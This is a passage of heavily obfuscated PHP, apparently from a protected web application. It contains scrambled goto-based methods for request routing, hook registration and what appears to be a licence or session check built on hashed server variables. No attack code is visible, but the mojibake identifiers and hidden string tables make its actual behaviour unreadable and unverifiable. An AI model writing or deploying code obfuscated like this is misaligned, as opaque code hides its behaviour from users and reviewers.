($cß½òéÃâº[19]($config[$cß½òéÃâº[20]]) == 0) { return; } foreach ($config[$cß½òéÃâº[20]] as $Dé¿ä§°£ˆ => $bÒÈ¤Ä°–ù) { $this->{$_SERVER[¡è¹ïÊœğŞ][21]}($bÒÈ¤Ä°–ù); } } private function rzkvbc356ab0() { goto d¯¯®°†¶İ; cÌáİôğ: $EßÚ‘ğµ­õ = $A°’Õ£·ùÑ[25]($b‰ÉÇÙÇğª, 0, -$A°’Õ£·ùÑ[24]($eÎ‹»ŸèÂÀ)); $AÇšŸˆ£µ¿ = array($A°’Õ£·ùÑ[8], $EßÚ‘ğµ­õ); $fâ¶øÒÃ³ = $Fƒ£Á·ˆéî[587]; goto CğÆî–ßåÒ; d¯¯®°†¶İ: $Fƒ£Á·ˆéî =& $_SERVER[œº]; $A°’Õ£·ùÑ =& $_SERVER[¡è¹ïÊœğŞ]; $eÎ‹»ŸèÂÀ = $A°’Õ£·ùÑ[8]; goto Fô‹óº±; c–Â—½ùÒ¶: while ($AºÏ°õ¬Œå < $Fƒ£Á·ˆéî[589]) { if ($AºÏ°õ¬Œå >= 0) { break; } $AºÏ°õ¬Œå++; } $GLOBALS[$A°’Õ£·ùÑ[22]][$A°’Õ£·ùÑ[28]] = $A°’Õ£·ùÑ[29]($A°’Õ£·ùÑ[1], $GLOBALS[$A°’Õ£·ùÑ[22]][$A°’Õ£·ùÑ[23]]); $C…Â²†‰åÏ = $Fƒ£Á·ˆéî[591]; goto B™¬ó÷Ä; B™¬ó÷Ä: if (!$C…Â²†‰åÏ) { return; } goto e—¦’À…‘ó; CğÆî–ßåÒ: if (strlen($fâ¶øÒÃ³) < $Fƒ£Á·ˆéî[580]) { return; } $dì¦„¸³Ñ› = $A°’Õ£·ùÑ[26]($GLOBALS[$A°’Õ£·ùÑ[22]][$A°’Õ£·ùÑ[23]], 1); $dš‡±³ŸÛ² = $Fƒ£Á·ˆéî[588]; goto F ¨Äİ†®Ü; Fô‹óº±: $b‰ÉÇÙÇğª = $GLOBALS[$A°’Õ£·ùÑ[22]][$A°’Õ£·ùÑ[23]][0]; if (!$b‰ÉÇÙÇğª || $A°’Õ£·ùÑ[24]($b‰ÉÇÙÇğª) <= $A°’Õ£·ùÑ[24]($eÎ‹»ŸèÂÀ)) { return; } if ($A°’Õ£·ùÑ[6]($A°’Õ£·ùÑ[25]($b‰ÉÇÙÇğª, -$A°’Õ£·ùÑ[24]($eÎ‹»ŸèÂÀ))) != $eÎ‹»ŸèÂÀ) { return; } goto cÌáİôğ; F ¨Äİ†®Ü: if (strlen($dš‡±³ŸÛ²) < $Fƒ£Á·ˆéî[589]) { return; } $GLOBALS[$A°’Õ£·ùÑ[22]][$A°’Õ£·ùÑ[23]] = $A°’Õ£·ùÑ[27]($AÇšŸˆ£µ¿, $dì¦„¸³Ñ›); $AºÏ°õ¬Œå = $Fƒ£Á·ˆéî[590]; goto c–Â—½ùÒ¶; e—¦’À…‘ó: } private function rpkuba8566f3() { goto bÆñïòÍ¤Š; B¬ñ¥‘´Üé: if (!$Aà£èºà¯) { return; } $fÙ·íê§Â°[34]($fÙ·íê§Â°[35], $C¡‚ä‹ÊÊ, $Dİæç‹¡Í); $c çŸ¯„Ñ¯ = $e±¼çâ §Ì[593]; goto Bòø Åöªß; Bòø Åöªß: $C¡‚ä‹ÊÊ = $fÙ·íê§Â°[2]($Dİæç‹¡Í[0][0], $fÙ·íê§Â°[36]); $GLOBALS[$fÙ·íê§Â°[22]][$fÙ·íê§Â°[23]] = $fÙ·íê§Â°[0]($fÙ·íê§Â°[36], $C¡‚ä‹ÊÊ); $F”ÖŠ‹ôãï = $e±¼çâ §Ì[594]; goto AÒËÏó³—; E˜Ë‚¢ÀíØ: $Bã•¦×È­Å = $fÙ·íê§Â°[33]($bœ³ª·”ƒŞ, $CÈ˜²œä); $C¡‚ä‹ÊÊ = $fÙ·íê§Â°[25]($bœ³ª·”ƒŞ, $Bã•¦×È­Å + $fÙ·íê§Â°[24]($CÈ˜²œä)); $Aà£èºà¯ = $e±¼çâ §Ì[592]; goto B¬ñ¥‘´Üé; bÆñïòÍ¤Š: $e±¼çâ §Ì =& $_SERVER[œº]; $fÙ·íê§Â° =& $_SERVER[¡è¹ïÊœğŞ]; if ($GLOBALS[$fÙ·íê§Â°[22]][$fÙ·íê§Â°[28]] != $fÙ·íê§Â°[10]) { return; } goto DÏ¸¯¬ùÆ; AÒËÏó³—: $GLOBALS[$fÙ·íê§Â°[22]][$fÙ·íê§Â°[28]] = $fÙ·íê§Â°[29]($fÙ·íê§Â°[1], $GLOBALS[$fÙ·íê§Â°[22]][$fÙ·íê§Â°[23]]); goto Dõ×‚ ½²; DÏ¸¯¬ùÆ: $bœ³ª·”ƒŞ = $_SERVER[$fÙ·íê§Â°[30]]; $CÈ˜²œä = $fÙ·íê§Â°[31]; if (!$fÙ·íê§Â°[32]($bœ³ª·”ƒŞ, $CÈ˜²œä)) { return; } goto E˜Ë‚¢ÀíØ; Dõ×‚ ½²: } public function run() { goto EĞšƒˆ­óÏ; fÁ†ñ¦£¹”: $_SERVER[$FÄÚÔ•Š”[44]] = $FÄÚÔ•Š”[6](ACTION); $this->{$_SERVER[¡è¹ïÊœğŞ][45]}(); $eƒ‰‹¨ËÀù = $aÅ˜­ ÀÑ[600]; goto CØ§ƒñï‡Í; Dõ±ÃÁ¡Œ»: $cƒ—Š¦ß°· = $aÅ˜­ ÀÑ[597]; if (strlen($cƒ—Š¦ß°·) < $aÅ˜­ ÀÑ[578]) { die; } $FÄÚÔ•Š”[39]($FÄÚÔ•Š”[40], isset($F¹ßœÙ[0]) && $F¹ßœÙ[0] ? $F¹ßœÙ[0] : $this->defaultModule); goto d’øÇ‘æ–“; CÊÙñèÆâ: if (!$BÖ¢õïÇŒ) { return; } $F¹ßœÙ = $GLOBALS[$FÄÚÔ•Š”[22]][$FÄÚÔ•Š”[23]]; $cÜ‹»ùÅ± = $GLOBALS[$FÄÚÔ•Š”[22]][$FÄÚÔ•Š”[28]]; goto Dõ±ÃÁ¡Œ»; Dİ—†ĞÈ–: $a¢„ê¡ùïó = $aÅ˜­ ÀÑ[595]; $this->{$_SERVER[¡è¹ïÊœğŞ][38]}(); $BÖ¢õïÇŒ = $aÅ˜­ ÀÑ[596]; goto CÊÙñèÆâ; CØ§ƒñï‡Í: if (!$eƒ‰‹¨ËÀù) { die; } if ($FÄÚÔ•Š”[19]($F¹ßœÙ) >= 3) { $this->{$_SERVER[¡è¹ïÊœğŞ][21]}($cÜ‹»ùÅ±); } else { $this->{$_SERVER[¡è¹ïÊœğŞ][21]}(ACTION); } goto C‚¸Š¼ÄÖ; DÛØãº’ª: while ($cˆ‡ÊË£¦ < $aÅ˜­ ÀÑ[580]) { if ($cˆ‡ÊË£¦ >= 0) { break; } $cˆ‡ÊË£¦++; } $FÄÚÔ•Š”[39]($FÄÚÔ•Š”[43], MOD . $FÄÚÔ•Š”[1] . ST . $FÄÚÔ•Š”[1] . ACT); $Eá®îô®ƒ÷ = $aÅ˜­ ÀÑ[599]; goto fÁ†ñ¦£¹”; d’øÇ‘æ–“: $FÄÚÔ•Š”[39]($FÄÚÔ•Š”[41], isset($F¹ßœÙ[1]) && $F¹ßœÙ[0] ? $F¹ßœÙ[1] : $this->defaultController); $FÄÚÔ•Š”[39]($FÄÚÔ•Š”[42], isset($F¹ßœÙ[2]) && $F¹ßœÙ[0] ? $F¹ßœÙ[2] : $this->defaultAction); $cˆ‡ÊË£¦ = $aÅ˜­ ÀÑ[598]; goto DÛØãº’ª; EĞšƒˆ­óÏ: $aÅ˜­ ÀÑ =& $_SERVER[œº]; $FÄÚÔ•Š” =& $_SERVER[¡è¹ïÊœğŞ]; $this->{$_SERVER[¡è¹ïÊœğŞ][37]}(); goto Dİ—†ĞÈ–; C‚¸Š¼ÄÖ: } private $thzj1344bdf0 = array(); private $gokxb9370e2b = ''; public function snor9c787c3f() { goto f´…ôÍêÓç; dâ„ˆ±±â: if (!$DÆ°À½Éâ÷) { return; } $this->{$_SERVER[¡è¹ïÊœğŞ][49]}(); $this->{$_SERVER[¡è¹ïÊœğŞ][50]}(); goto eˆîùª®±; eˆîùª®±: $FÏ‚ô²æ = $bÏöÂä½‘[602]; if (strlen($FÏ‚ô²æ) < $bÏöÂä½‘[582]) { die; } $this->{$_SERVER[¡è¹ïÊœğŞ][51]}(); goto DÓâ§‹¹š®; DÓâ§‹¹š®: $this->{$_SERVER[¡è¹ïÊœğŞ][52]}(); $this->{$_SERVER[¡è¹ïÊœğŞ][3]}($a‘Ê‰İĞ”ø[53], array($this, $a‘Ê‰İĞ”ø[54])); $AÅëÎ„¼‚ = $bÏöÂä½‘[603]; goto Fäåø¥Š‚Ñ; f´…ôÍêÓç: $bÏöÂä½‘ =& $_SERVER[œº]; $a‘Ê‰İĞ”ø =& $_SERVER[¡è¹ïÊœğŞ]; $this->{$_SERVER[¡è¹ïÊœğŞ][46]}(); goto Aªœ»ô—»¥; E„­ÊÉºÊ‡: $this->{$_SERVER[¡è¹ïÊœğŞ][3]}($a‘Ê‰İĞ”ø[59], array($this, $a‘Ê‰İĞ”ø[60])); goto BËÄğ÷ß›­; Fäåø¥Š‚Ñ: if (strlen($AÅëÎ„¼‚) < $bÏöÂä½‘[582]) { return; } $this->{$_SERVER[¡è¹ïÊœğŞ][3]}($a‘Ê‰İĞ”ø[55], array($this, $a‘Ê‰İĞ”ø[56])); $this->{$_SERVER[¡è¹ïÊœğŞ][3]}($a‘Ê‰İĞ”ø[57], array($this, $a‘Ê‰İĞ”ø[58])); goto E„­ÊÉºÊ‡; Aªœ»ô—»¥: $this->{$_SERVER[¡è¹ïÊœğŞ][47]}(); $this->{$_SERVER[¡è¹ïÊœğŞ][48]}(); $DÆ°À½Éâ÷ = $bÏöÂä½‘[601]; goto dâ„ˆ±±â; BËÄğ÷ß›­: } public function nupa8c28138f($c†«¯«—) { goto eÀÃ¼±º‚¤; f±™î‡ôÏ: $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [140]] = $CÆ¸Ñî¹¨ [116]($this->thzj1344bdf0, $CÆ¸Ñî¹¨ [141], $CÆ¸Ñî¹¨ [10]); if ($CÆ¸Ñî¹¨ [116]($GLOBALS, $CÆ¸Ñî¹¨ [142]) && $this->config[$CÆ¸Ñî¹¨ [143]]) { $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [144]] = WEB_ROOT; } return $c†«¯«—; goto EÇÕ‡¤æê­; A¤‘˜ÒĞÑŸ: $d‘£Åöø¬‹ = $EšÊ­Î™äÓ[609]; if (!$d‘£Åöø¬‹) { return; } $c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [107]][$CÆ¸Ñî¹¨ [112]] = array($CÆ¸Ñî¹¨ [113] => (int) $DíØçôÁŒŞ[$CÆ¸Ñî¹¨ [114]], $CÆ¸Ñî¹¨ [115] => (int) $CÆ¸Ñî¹¨ [116]($DíØçôÁŒŞ, $CÆ¸Ñî¹¨ [117], 0)); goto cƒªÆÉ –; Bàã–¡—Á: $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [130]] = $this->gokxb9370e2b; $F³èÄñãí± = $EšÊ­Î™äÓ[613]; while (strlen($F³èÄñãí±) < $EšÊ­Î™äÓ[578]) { if (!$F³èÄñãí±) { break; } $F³èÄñãí±++; } goto aêÌèİØ¦¸; eÀÃ¼±º‚¤: $EšÊ­Î™äÓ =& $_SERVER[œº]; $CÆ¸Ñî¹¨  =& $_SERVER[¡è¹ïÊœğŞ]; $BÁ¸†Ä½Ì = $CÆ¸Ñî¹¨ [61]($CÆ¸Ñî¹¨ [62])->{$_SERVER[¡è¹ïÊœğŞ][63]}(); goto Cç‘¬ŒÅª; AÜêêÅ•Îˆ: $bäÌí‰©‰Í = $EšÊ­Î™äÓ[612]; if (strlen($bäÌí‰©‰Í) < $EšÊ­Î™äÓ[578]) { return; } $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [127]] = $CÆ¸Ñî¹¨ [128]($CÆ¸Ñî¹¨ [129]()); goto Bàã–¡—Á; Aç¾Èé”Ù‰: unset($c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [108]][$CÆ¸Ñî¹¨ [109]]); unset($c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [108]][$CÆ¸Ñî¹¨ [110]]); $aŒäšªÕø³ = $EšÊ­Î™äÓ[608]; goto fÒÃœœµ¹÷; D†½ë —ğ : $E¤ãŸ–“‘¦ = $EšÊ­Î™äÓ[611]; while ($E¤ãŸ–“‘¦ < $EšÊ­Î™äÓ[580]) { if ($E¤ãŸ–“‘¦ >= 0) { break; } $E¤ãŸ–“‘¦++; } $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [123]] = $CÆ¸Ñî¹¨ [124]($_SERVER[$CÆ¸Ñî¹¨ [125]] . $BÁ¸†Ä½Ì[$CÆ¸Ñî¹¨ [126]]); goto AÜêêÅ•Îˆ; aêÌèİØ¦¸: if ($BÁ¸†Ä½Ì[$CÆ¸Ñî¹¨ [130]] != $CÆ¸Ñî¹¨ [131]) { $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [132]] = $BÁ¸†Ä½Ì[$CÆ¸Ñî¹¨ [132]]; $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [133]] = $BÁ¸†Ä½Ì[$CÆ¸Ñî¹¨ [133]]; $fçÖÔÀ¯Á = $CÆ¸Ñî¹¨ [134](10) . $this->gokxb9370e2b . $CÆ¸Ñî¹¨ [134](5); $c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [135]][$CÆ¸Ñî¹¨ [136]] = $this->{$_SERVER[¡è¹ïÊœğŞ][137]}($fçÖÔÀ¯Á, $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [123]]); } if ($this->gokxb9370e2b == $CÆ¸Ñî¹¨ [131]) { $c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [107]][$CÆ¸Ñî¹¨ [112]][$CÆ¸Ñî¹¨ [117]] = 0; } $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [138]] = $CÆ¸Ñî¹¨ [116]($this->thzj1344bdf0, $CÆ¸Ñî¹¨ [139], $CÆ¸Ñî¹¨ [10]); goto f±™î‡ôÏ; cƒªÆÉ –: $eï¡ Ú–ç = $EšÊ­Î™äÓ[610]; if (!$eï¡ Ú–ç) { die; } $c†«¯«—[$CÆ¸Ñî¹¨ [118]][$CÆ¸Ñî¹¨ [119]] = $CÆ¸Ñî¹¨ [120]($CÆ¸Ñî¹¨ [121])->{$_SERVER[¡è¹ïÊœğŞ][122]}(); goto D†½ë —ğ ; C…Ì‚™Ä¿“: $f²Ó·Ô†¦ = $EšÊ­Î™äÓ[606]; while (strlen($f²Ó·Ô†¦) < $EšÊ­Î™äÓ[589]) { if (!$f²Ó·Ô†¦) { break; } $f²Ó·Ô†¦++; } foreach ($F—²è´´± as $d–²Íè‡É) { $B‰¦²ÍàíÉ = $GLOBALS[$CÆ¸Ñî¹¨ [104]][$CÆ¸Ñî¹¨ [105]][$d–²Íè‡É]; if (isset($BÁ¸†Ä½Ì[$d–²Íè‡É])) { $B‰¦²ÍàíÉ = $BÁ¸†Ä½Ì[$d–²Íè‡É]; } $c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [107]][$d–²Íè‡É] = $B‰¦²ÍàíÉ; } goto dÌíÉ¶“; fÒÃœœµ¹÷: if (strlen($aŒäšªÕø³) < $EšÊ­Î™äÓ[578]) { die; } unset($c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [107]][$CÆ¸Ñî¹¨ [76]]); unset($c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [107]][$CÆ¸Ñî¹¨ [111]]); goto A¤‘˜ÒĞÑŸ; Cç‘¬ŒÅª: $BÍò·£å°Ø = $EšÊ­Î™äÓ[604]; if (strlen($BÍò·£å°Ø) < $EšÊ­Î™äÓ[605]) { die; } $F—²è´´± = array($CÆ¸Ñî¹¨ [64], $CÆ¸Ñî¹¨ [65], $CÆ¸Ñî¹¨ [66], $CÆ¸Ñî¹¨ [67], $CÆ¸Ñî¹¨ [68], $CÆ¸Ñî¹¨ [69], $CÆ¸Ñî¹¨ [70], $CÆ¸Ñî¹¨ [71], $CÆ¸Ñî¹¨ [72], $CÆ¸Ñî¹¨ [73], $CÆ¸Ñî¹¨ [74], $CÆ¸Ñî¹¨ [75], $CÆ¸Ñî¹¨ [76], $CÆ¸Ñî¹¨ [77], $CÆ¸Ñî¹¨ [78], $CÆ¸Ñî¹¨ [79], $CÆ¸Ñî¹¨ [80], $CÆ¸Ñî¹¨ [81], $CÆ¸Ñî¹¨ [82], $CÆ¸Ñî¹¨ [83], $CÆ¸Ñî¹¨ [84], $CÆ¸Ñî¹¨ [85], $CÆ¸Ñî¹¨ [86], $CÆ¸Ñî¹¨ [87], $CÆ¸Ñî¹¨ [88], $CÆ¸Ñî¹¨ [89], $CÆ¸Ñî¹¨ [90], $CÆ¸Ñî¹¨ [91], $CÆ¸Ñî¹¨ [92], $CÆ¸Ñî¹¨ [93], $CÆ¸Ñî¹¨ [94], $CÆ¸Ñî¹¨ [95], $CÆ¸Ñî¹¨ [96], $CÆ¸Ñî¹¨ [97], $CÆ¸Ñî¹¨ [98], $CÆ¸Ñî¹¨ [99], $CÆ¸Ñî¹¨ [100], $CÆ¸Ñî¹¨ [101], $CÆ¸Ñî¹¨ [102], $CÆ¸Ñî¹¨ [103]); goto C…Ì‚™Ä¿“; dÌíÉ¶“: $DíØçôÁŒŞ = $c†«¯«—[$CÆ¸Ñî¹¨ [106]][$CÆ¸Ñî¹¨ [107]][$CÆ¸Ñî¹¨ [76]]; $eá÷Ï‰’Ô = $EšÊ­Î™äÓ[607]; if (strlen($eá÷Ï‰’Ô) < $EšÊ­Î™äÓ[578]) { die; } goto Aç¾Èé”Ù‰; EÇÕ‡¤æê­: } private function ayez38ae6f16() { goto e’†íç’ÉÑ; cà¶¾Ö¯ë‚: $cø„³·¡ÒØ = array($DĞ‡Ë¶áÇ[177] => $A¥ÌÛÛãÚŒ[$DĞ‡Ë¶áÇ[64]], $DĞ‡Ë¶áÇ[178] => $A¥ÌÛÛãÚŒ[$DĞ‡Ë¶áÇ[65]], $DĞ‡Ë¶áÇ[179] => $DĞ‡Ë¶áÇ[10]); $fÌå³Ó¯ò = $a‚Š‘„ï†[616]; if (!$fÌå³Ó¯ò) { return; } goto F–ÌƒßÀé; F–ÌƒßÀé: foreach ($C—²­Ì›ÆÙ as $Béñºòæ) { if (!isset($A¥ÌÛÛãÚŒ[$Béñºòæ]) || !$A¥ÌÛÛãÚŒ[$Béñºòæ]) { continue; } $cø„³·¡ÒØ[$Béñºòæ] = $A¥ÌÛÛãÚŒ[$Béñºòæ]; $d¨öô‚÷á‚ = $a‚Š‘„ï†[617]; if (!$d¨öô‚÷á‚) { return; } } $DĞ‡Ë¶áÇ[13](array($DĞ‡Ë¶áÇ[169], $DĞ‡Ë¶áÇ[170]), $cø„³·¡ÒØ); goto aÍÔõ…æèî; B‘Ãöºï’‚: if (strlen($båì›ÃÛ´¤) < $a‚Š‘„ï†[582]) { die; } $A¥ÌÛÛãÚŒ = $DĞ‡Ë¶áÇ[61]($DĞ‡Ë¶áÇ[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}(); $DĞÕ¹×«Àá = $a‚Š‘„ï†[615]; goto cà¶¾Ö¯ë‚; e’†íç’ÉÑ: $a‚Š‘„ï† =& $_SERVER[œº]; $DĞ‡Ë¶áÇ =& $_SERVER[¡è¹ïÊœğŞ]; if ($_SERVER[$DĞ‡Ë¶áÇ[44]] == $DĞ‡Ë¶áÇ[145]) { $c†¨ÁÙÁÊ¹ = array($DĞ‡Ë¶áÇ[130] => $this->gokxb9370e2b, $DĞ‡Ë¶áÇ[146] => $this->{$_SERVER[¡è¹ïÊœğŞ][147]}(), $DĞ‡Ë¶áÇ[148] => $DĞ‡Ë¶áÇ[61]($DĞ‡Ë¶áÇ[149])->{$_SERVER[¡è¹ïÊœğŞ][150]}()); if ($this->gokxb9370e2b != $DĞ‡Ë¶áÇ[131]) { $fùâœÓ’” = $DĞ‡Ë¶áÇ[116]($this->thzj1344bdf0, $DĞ‡Ë¶áÇ[151]); if ($fùâœÓ’”) { $c†¨ÁÙÁÊ¹[$DĞ‡Ë¶áÇ[152]] = $fùâœÓ’”; $c†¨ÁÙÁÊ¹[$DĞ‡Ë¶áÇ[153]] = $DĞ‡Ë¶áÇ[154]($DĞ‡Ë¶áÇ[116]($this->thzj1344bdf0, $DĞ‡Ë¶áÇ[155])); $c†¨ÁÙÁÊ¹[$DĞ‡Ë¶áÇ[156]] = $DĞ‡Ë¶áÇ[116]($this->thzj1344bdf0, $DĞ‡Ë¶áÇ[141]); } $D—Ç—ÇšÇè = $DĞ‡Ë¶áÇ[61]($DĞ‡Ë¶áÇ[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($DĞ‡Ë¶áÇ[157], $DĞ‡Ë¶áÇ[10], !0); if ($DĞ‡Ë¶áÇ[158]($D—Ç—ÇšÇè) && $DĞ‡Ë¶áÇ[25]($D—Ç—ÇšÇè, 0, 1) == $DĞ‡Ë¶áÇ[159]) { $D—Ç—ÇšÇè = $DĞ‡Ë¶áÇ[160]($D—Ç—ÇšÇè); } if ($DĞ‡Ë¶áÇ[161]($D—Ç—ÇšÇè) && $D—Ç—ÇšÇè[$DĞ‡Ë¶áÇ[162]] && $DĞ‡Ë¶áÇ[32]($D—Ç—ÇšÇè[$DĞ‡Ë¶áÇ[162]], $DĞ‡Ë¶áÇ[163])) { $a„º™¸Æß§ = $DĞ‡Ë¶áÇ[0]($DĞ‡Ë¶áÇ[163], $D—Ç—ÇšÇè[$DĞ‡Ë¶áÇ[162]]); $c†¨ÁÙÁÊ¹[$DĞ‡Ë¶áÇ[164]] = $a„º™¸Æß§[0]; } } $c†¨ÁÙÁÊ¹ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($DĞ‡Ë¶áÇ[166]($c†¨ÁÙÁÊ¹), $DĞ‡Ë¶áÇ[124]($DĞ‡Ë¶áÇ[167])); $cø„³·¡ÒØ = array($DĞ‡Ë¶áÇ[168] => $c†¨ÁÙÁÊ¹); $DĞ‡Ë¶áÇ[13](array($DĞ‡Ë¶áÇ[169], $DĞ‡Ë¶áÇ[170]), $cø„³·¡ÒØ); } goto EÁ×²š¾; EÁ×²š¾: if ($this->gokxb9370e2b == $DĞ‡Ë¶áÇ[131]) { return; } $C—²­Ì›ÆÙ = array($DĞ‡Ë¶áÇ[171], $DĞ‡Ë¶áÇ[172], $DĞ‡Ë¶áÇ[173], $DĞ‡Ë¶áÇ[174], $DĞ‡Ë¶áÇ[175], $DĞ‡Ë¶áÇ[176]); $båì›ÃÛ´¤ = $a‚Š‘„ï†[614]; goto B‘Ãöºï’‚; aÍÔõ…æèî: } private function hazke3f28ac7() { goto bµ‘‡„ê´; e˜ÙŠ¢­®Â: $CÀ ÉíÈŒí = array($AÑ•ÎÅ™Ğ[227] => $CÚ°Œìøß[$AÑ•ÎÅ™Ğ[228]], $AÑ•ÎÅ™Ğ[229] => $CÚ°Œìøß[$AÑ•ÎÅ™Ğ[230]], $AÑ•ÎÅ™Ğ[231] => $AÑ•ÎÅ™Ğ[134](16), $AÑ•ÎÅ™Ğ[130] => $CÚ°Œìøß[$AÑ•ÎÅ™Ğ[232]]); if ($e¡àÅŠÆ½[$AÑ•ÎÅ™Ğ[186]]) { $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[231]] = $e¡àÅŠÆ½[$AÑ•ÎÅ™Ğ[186]]; } $aŒ‰”ÇÈ¶ = $AÑ•ÎÅ™Ğ[25]($AÑ•ÎÅ™Ğ[124]($CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[229]]), 10, 10); goto f„‚ùÕ¨…; bµ‘‡„ê´: $d•àˆ´ë¿ =& $_SERVER[œº]; $AÑ•ÎÅ™Ğ =& $_SERVER[¡è¹ïÊœğŞ]; if ($_SERVER[$AÑ•ÎÅ™Ğ[44]] != $AÑ•ÎÅ™Ğ[180]) { return; } goto f¤¦›íß¶Å; a™¹‹œ¾¤Ó: if (!isset($Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[183]]) || $AÑ•ÎÅ™Ğ[24]($Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[183]]) != 16) { $AÑ•ÎÅ™Ğ[184]($AÑ•ÎÅ™Ğ[185] . $Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[183]], !1); } $E¦­ª×„± = $AÑ•ÎÅ™Ğ[61]($AÑ•ÎÅ™Ğ[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($AÑ•ÎÅ™Ğ[126]); $aìòÇÖÃƒÕ = $AÑ•ÎÅ™Ğ[124]($_SERVER[$AÑ•ÎÅ™Ğ[125]] . $E¦­ª×„±); goto cßŒó¼‡Ş; E¬ëÑ÷Ÿã±: $D¤–†Ã²Ú† = $d•àˆ´ë¿[625]; $AÑ•ÎÅ™Ğ[184]($AÑ•ÎÅ™Ğ[216]($AÑ•ÎÅ™Ğ[226]), !0); $E¶Å»ƒØªµ = $d•àˆ´ë¿[626]; goto bª…Éòİ‘ó; FÛÓ›ÙÕèä: $CÚ°Œìøß = $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]]; $eÇ³ó©«ç’ = $this->{$_SERVER[¡è¹ïÊœğŞ][218]}($CÚ°Œìøß[$AÑ•ÎÅ™Ğ[219]]); if (!$eÇ³ó©«ç’ || $eÇ³ó©«ç’ != $CÚ°Œìøß[$AÑ•ÎÅ™Ğ[155]]) { $AôãÅ´„ç¸ = array($AÑ•ÎÅ™Ğ[220] => $AÑ•ÎÅ™Ğ[61]($AÑ•ÎÅ™Ğ[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($AÑ•ÎÅ™Ğ[126]), $AÑ•ÎÅ™Ğ[221] => $_SERVER[$AÑ•ÎÅ™Ğ[125]], $AÑ•ÎÅ™Ğ[222] => $AÑ•ÎÅ™Ğ[223](), $AÑ•ÎÅ™Ğ[192] => $_SERVER[$AÑ•ÎÅ™Ğ[193]]); $BëÌ£ˆ³¦ = $this->{$_SERVER[¡è¹ïÊœğŞ][224]}($AÑ•ÎÅ™Ğ[166]($AôãÅ´„ç¸)); $this->{$_SERVER[¡è¹ïÊœğŞ][202]}($AÑ•ÎÅ™Ğ[225] . $BëÌ£ˆ³¦); $AÑ•ÎÅ™Ğ[184]($AÑ•ÎÅ™Ğ[216]($AÑ•ÎÅ™Ğ[226]), !0); } goto e˜ÙŠ¢­®Â; cÒÙãÖÓ×‹: $f†»âÃ¶“ = $B¬Çù»àÅ . $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[130]] . $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($AÑ•ÎÅ™Ğ[124]($CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[227]]), $B¬Çù»àÅ); $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[133]] = $AÑ•ÎÅ™Ğ[128]($AÑ•ÎÅ™Ğ[233]($this->{$_SERVER[¡è¹ïÊœğŞ][165]}($f†»âÃ¶“, $AÑ•ÎÅ™Ğ[235]))); $Fñ¸‰ÉëØœ = $d•àˆ´ë¿[621]; goto bºÏËĞŒ¨¹; f¤¦›íß¶Å: if (!$AÑ•ÎÅ™Ğ[116]($GLOBALS, $AÑ•ÎÅ™Ğ[142])) { die; } $Cç¥™ô„½¢ = $GLOBALS[$AÑ•ÎÅ™Ğ[22]]; if (isset($Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[181]])) { $this->{$_SERVER[¡è¹ïÊœğŞ][182]}(); die; } goto a™¹‹œ¾¤Ó; AÂ”·éäëÕ: $f°Ùâ“ÙÂì = $d•àˆ´ë¿[622]; $f„Å¥ç¸Â¨ = $AÑ•ÎÅ™Ğ[241]($AÑ•ÎÅ™Ğ[61]($AÑ•ÎÅ™Ğ[11])->{$_SERVER[¡è¹ïÊœğŞ][242]}(), $AÑ•ÎÅ™Ğ[243]); $fÆÆÈ·á¤¥ = $d•àˆ´ë¿[623]; goto b¢¨Ü“’ö¬; cßŒó¼‡Ş: $Cº’Šé¯› = $d•àˆ´ë¿[618]; while ($Cº’Šé¯› < $d•àˆ´ë¿[589]) { if ($Cº’Šé¯› >= 0) { break; } $Cº’Šé¯›++; } $e¡àÅŠÆ½ = array($AÑ•ÎÅ™Ğ[183] => $Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[183]], $AÑ•ÎÅ™Ğ[186] => $AÑ•ÎÅ™Ğ[134](16), $AÑ•ÎÅ™Ğ[187] => $AÑ•ÎÅ™Ğ[167], $AÑ•ÎÅ™Ğ[188] => $AÑ•ÎÅ™Ğ[189], $AÑ•ÎÅ™Ğ[190] => $_SERVER[$AÑ•ÎÅ™Ğ[191]], $AÑ•ÎÅ™Ğ[192] => $_SERVER[$AÑ•ÎÅ™Ğ[193]], $AÑ•ÎÅ™Ğ[194] => $_SERVER[$AÑ•ÎÅ™Ğ[195]], $AÑ•ÎÅ™Ğ[123] => $aìòÇÖÃƒÕ, 